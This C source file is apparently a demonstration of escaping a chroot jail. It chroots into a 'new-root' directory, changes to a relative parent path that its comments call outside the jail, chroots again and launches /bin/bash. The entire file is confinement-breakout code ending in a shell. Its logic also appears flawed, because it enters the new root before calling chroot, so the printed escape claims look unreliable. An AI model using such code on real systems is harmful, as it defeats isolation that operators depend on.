#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

#define BUF_SIZE 1024

int main(int argc, char ** argv){


  char buffer[BUF_SIZE];
  int result;

  // Print original working directory
  getcwd(buffer, BUF_SIZE);
  printf("Original working directory: %s\n", buffer);

  // Chroot into new-root directory
  chdir("./new-root");
  getcwd(buffer, BUF_SIZE);
  result = chroot(buffer);
  printf("chroot directory: %s\n", buffer);

  if (result == -1){
    perror("chroot");
    return -1;
  }

 // chdir into relative path outside jail
  result = chdir("../../../");
  printf("Called chdir to get out of jail \n");
  getcwd(buffer, BUF_SIZE);
  printf("Working directory outside jail: %s\n", buffer);

  if (result == -1){
    perror("chdir");
    return -1;
  }

  // chroot to current directory
  result = chroot(".");
  printf("Chrooted into current directory\n");
  getcwd(buffer, BUF_SIZE);
  printf("Chroot of outside working directory: %s\n", buffer);

  if (result == -1){
    perror("chroot");
    return -1;
  }

  // exec /bin/bash
  result = execl("/bin/bash", "/bin/bash", NULL);

  if (result == -1){
    perror("execl");
    return -1;
  }

  return 0;
}
